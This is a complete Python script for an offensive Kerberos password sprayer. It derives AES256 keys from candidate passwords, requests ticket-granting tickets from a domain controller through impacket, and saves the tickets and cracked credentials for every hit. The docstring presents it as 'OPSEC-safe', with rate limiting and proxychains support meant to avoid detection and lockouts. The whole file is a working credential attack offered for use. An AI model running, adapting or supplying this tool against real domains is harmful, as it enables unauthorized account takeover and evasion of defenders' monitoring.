#!/usr/bin/env python3
"""
aesspraying.py — OPSEC-safe AES256 Kerberos password sprayer.

Derives AES256 keys from cleartext passwords (no RC4, no NTLM on the wire)
and requests TGTs via impacket-getTGT. Rate-limited to stay under detection
threshold (default: 1 attempt per account per spray round).

Usage:
    # Single account, single password
    python3 aesspraying.py -p <password> -a <sAMAccountName> -d <domain> [options]

    # List mode — userlist vs passwordlist
    python3 aesspraying.py -P <passlist> -A <userlist> -d <domain> [options]

Examples:
    python3 aesspraying.py -p 'Vend0r'"'"'sDatabaseSecret' -a mspdb -d msp.local --dc-ip 192.168.250.1

    python3 aesspraying.py -P passwords.txt -A users.txt -d msp.local --dc-ip 192.168.250.1 -t 5

    python3 aesspraying.py -P passwords.txt -A users.txt -d msp.local --dc-ip 192.168.250.1 -t 5 --proxychains

    # Read password from file (avoids shell expansion of special chars)
    python3 aesspraying.py -pfile pass.txt -a mspdb -d msp.local --dc-ip 192.168.250.1

Spray logic:
    List mode iterates password-by-password (outer), user-by-user (inner).
    Each user:password attempt is spaced -t minutes apart within a round.
    On success the ccache is saved as <user>@<domain>.ccache and spraying stops
    for that user. Use --no-stop to continue after first hit.

Output:
    [ TRY  ] user @ domain — password (attempt N)
    [  OK  ] user @ domain — TGT saved → user@domain.ccache
    [ FAIL ] user @ domain — bad credentials
    [ WAIT ] sleeping N minutes before next attempt

Dependencies:
    pip install impacket
    impacket-getTGT must be in PATH (comes with impacket install)
"""

import sys
import os
import argparse
import subprocess
import time
import shutil
from binascii import hexlify
from pathlib import Path

try:
    from impacket.krb5 import constants
    from impacket.krb5.crypto import string_to_key
except ImportError:
    print("[!] impacket not found. Install with: pip install impacket", file=sys.stderr)
    sys.exit(1)


# ──────────────────────────────────────────────────────────────────────────────
# Key derivation (from passtohash.py)
# ──────────────────────────────────────────────────────────────────────────────

def build_salt(domain: str, sam: str) -> str:
    domain_upper = domain.upper()
    domain_lower = domain.lower()
    if sam.endswith("$"):
        account = sam.rstrip("$").lower()
        return f"{domain_upper}host{account}.{domain_lower}"
    else:
        return f"{domain_upper}{sam.lower()}"


def derive_aes256(password: str, sam: str, domain: str) -> str:
    """Derive AES256 key from cleartext password, sAMAccountName and domain."""
    salt     = build_salt(domain, sam)
    pwd_utf8 = password.encode("utf-8")
    aes256   = hexlify(
        string_to_key(
            constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
            pwd_utf8, salt
        ).contents
    ).decode()
    return aes256


# ──────────────────────────────────────────────────────────────────────────────
# getTGT wrapper
# ──────────────────────────────────────────────────────────────────────────────

def try_tgt(sam: str, domain: str, aes256: str, dc_ip: str,
            use_proxychains: bool, output_dir: Path) -> bool:
    """
    Run impacket-getTGT with the derived AES256 key.
    Returns True on success, False on failure.
    Saves ccache to output_dir/<sam>@<domain>.ccache on success.
    """
    ccache_name = f"{sam}@{domain}.ccache"
    ccache_path = output_dir / ccache_name

    cmd = []
    if use_proxychains:
        cmd += ["proxychains", "-q"]

    cmd += [
        "impacket-getTGT",
        f"{domain}/{sam}",
        "-aesKey", aes256,
        "-dc-ip", dc_ip,
    ]

    env = os.environ.copy()
    env["KRB5CCNAME"] = str(ccache_path)

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            env=env,
            timeout=30,
        )
        combined = result.stdout + result.stderr

        if result.returncode == 0 and "Saving ticket" in combined:
            # impacket-getTGT saves to <sam>.ccache by default — move to our path
            default_ccache = Path(f"{sam}.ccache")
            if default_ccache.exists():
                default_ccache.rename(ccache_path)
            return True

        # Distinguish lockout-risk errors from simple bad creds
        if "KDC_ERR_PREAUTH_FAILED" in combined or "Wrong password" in combined:
            return False
        if "KDC_ERR_CLIENT_REVOKED" in combined:
            print(f"\n[!] ACCOUNT LOCKED OUT: {sam} — stopping spray for this user", flush=True)
            return None  # Signal lockout
        if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in combined:
            print(f"  [SKIP] {sam} — account does not exist", flush=True)
            return None

        return False

    except subprocess.TimeoutExpired:
        print(f"  [TIMEOUT] {sam} — getTGT timed out", flush=True)
        return False
    except FileNotFoundError:
        print("[!] impacket-getTGT not found in PATH", file=sys.stderr)
        sys.exit(1)


# ──────────────────────────────────────────────────────────────────────────────
# Spray logic
# ──────────────────────────────────────────────────────────────────────────────

def spray(users: list[str], passwords: list[str], domain: str, dc_ip: str,
          wait_minutes: float, use_proxychains: bool,
          no_stop: bool, output_dir: Path, verbose: bool):

    hits        = {}   # sam → (password, aes256, ccache_path)
    done_users  = set()
    total       = len(users) * len(passwords)
    attempt     = 0

    print(f"\n[*] Target domain : {domain}")
    print(f"[*] DC IP         : {dc_ip}")
    print(f"[*] Users         : {len(users)}")
    print(f"[*] Passwords     : {len(passwords)}")
    print(f"[*] Wait          : {wait_minutes}m between attempts")
    print(f"[*] Proxychains   : {use_proxychains}")
    print(f"[*] Output dir    : {output_dir}\n")

    for password in passwords:
        for sam in users:
            if sam in done_users:
                continue

            attempt += 1
            aes256 = derive_aes256(password, sam, domain)

            if verbose:
                print(f"[ TRY  ] {sam}@{domain} — {password!r}  (AES256: {aes256[:16]}...)", flush=True)
            else:
                print(f"[ TRY  ] {sam}@{domain} — {password!r}  ({attempt}/{total})", flush=True)

            result = try_tgt(sam, domain, aes256, dc_ip, use_proxychains, output_dir)

            if result is True:
                ccache = output_dir / f"{sam}@{domain}.ccache"
                print(f"[  OK  ] {sam}@{domain} — TGT saved → {ccache}", flush=True)
                hits[sam] = (password, aes256, str(ccache))
                if not no_stop:
                    done_users.add(sam)

            elif result is None:
                # Lockout or non-existent — skip this user entirely
                done_users.add(sam)

            else:
                print(f"[ FAIL ] {sam}@{domain}", flush=True)

            # Rate limiting — wait between attempts (skip after last attempt)
            remaining = [(u, p) for p in passwords for u in users
                         if u not in done_users and (p, u) != (password, sam)]
            if remaining and wait_minutes > 0:
                secs = wait_minutes * 60
                print(f"[ WAIT ] sleeping {wait_minutes}m ...", flush=True)
                time.sleep(secs)

    # ── Summary ───────────────────────────────────────────────────────────────
    print(f"\n{'─'*60}")
    print(f"  Spray complete — {len(hits)} hit(s) of {len(users)} user(s)")
    print(f"{'─'*60}")
    if hits:
        print()
        for sam, (pwd, aes, ccache) in hits.items():
            print(f"  [+] {sam}")
            print(f"      Password : {pwd!r}")
            print(f"      AES256   : {aes}")
            print(f"      ccache   : {ccache}")
        print()
    print(f"{'─'*60}\n")


# ──────────────────────────────────────────────────────────────────────────────
# Entry point
# ──────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        prog="aesspraying.py",
        description="OPSEC-safe AES256 Kerberos password sprayer — no RC4, no NTLM on the wire.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    # ── Password input ────────────────────────────────────────────────────────
    pwd_grp = parser.add_mutually_exclusive_group(required=True)
    pwd_grp.add_argument("-p",     metavar="PASSWORD",  help="Single cleartext password")
    pwd_grp.add_argument("-pfile", metavar="PATH",      help="Read single password from file (avoids shell expansion)")
    pwd_grp.add_argument("-P",     metavar="PASSLIST",  help="File containing one password per line")

    # ── User input ────────────────────────────────────────────────────────────
    usr_grp = parser.add_mutually_exclusive_group(required=True)
    usr_grp.add_argument("-a", metavar="USERNAME",  help="Single sAMAccountName")
    usr_grp.add_argument("-A", metavar="USERLIST",  help="File containing one sAMAccountName per line")

    # ── Required ──────────────────────────────────────────────────────────────
    parser.add_argument("-d",          required=True, metavar="DOMAIN",   help="FQDN of the target domain (e.g. msp.local)")
    parser.add_argument("--dc-ip",     required=True, metavar="IP",       help="IP of the domain controller")

    # ── Options ───────────────────────────────────────────────────────────────
    parser.add_argument("-t",            type=float, default=5.0, metavar="MINUTES",
                        help="Minutes to wait between attempts (default: 5)")
    parser.add_argument("--proxychains", action="store_true",
                        help="Prefix every getTGT call with 'proxychains -q'")
    parser.add_argument("--no-stop",     action="store_true",
                        help="Continue spraying a user even after a successful hit")
    parser.add_argument("--output-dir",  default=".", metavar="DIR",
                        help="Directory to save ccache files (default: current dir)")
    parser.add_argument("--verbose",     action="store_true",
                        help="Print derived AES256 key for each attempt")

    args = parser.parse_args()

    # ── Sanity checks ─────────────────────────────────────────────────────────
    if not shutil.which("impacket-getTGT"):
        print("[!] impacket-getTGT not found in PATH. Install impacket.", file=sys.stderr)
        sys.exit(1)

    if args.proxychains and not shutil.which("proxychains"):
        print("[!] proxychains not found in PATH.", file=sys.stderr)
        sys.exit(1)

    output_dir = Path(args.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    # ── Load passwords ────────────────────────────────────────────────────────
    if args.p:
        passwords = [args.p]
    elif args.pfile:
        try:
            passwords = [open(args.pfile).read().rstrip("\n")]
        except OSError as e:
            print(f"[!] Cannot read password file: {e}", file=sys.stderr)
            sys.exit(1)
    else:
        try:
            passwords = [l.rstrip("\n") for l in open(args.P) if l.strip()]
        except OSError as e:
            print(f"[!] Cannot read password list: {e}", file=sys.stderr)
            sys.exit(1)

    # ── Load users ────────────────────────────────────────────────────────────
    if args.a:
        users = [args.a]
    else:
        try:
            users = [l.rstrip("\n") for l in open(args.A) if l.strip()]
        except OSError as e:
            print(f"[!] Cannot read user list: {e}", file=sys.stderr)
            sys.exit(1)

    # ── Filter machine accounts for password spraying ─────────────────────────
    machine_accounts = [u for u in users if u.endswith("$")]
    if machine_accounts:
        print(f"[!] Skipping {len(machine_accounts)} machine account(s) — password spraying machine accounts is almost always wrong")
        users = [u for u in users if not u.endswith("$")]

    if not users:
        print("[!] No user accounts to spray after filtering.", file=sys.stderr)
        sys.exit(1)

    spray(
        users=users,
        passwords=passwords,
        domain=args.d,
        dc_ip=args.dc_ip,
        wait_minutes=args.t,
        use_proxychains=args.proxychains,
        no_stop=args.no_stop,
        output_dir=output_dir,
        verbose=args.verbose,
    )


if __name__ == "__main__":
    main()
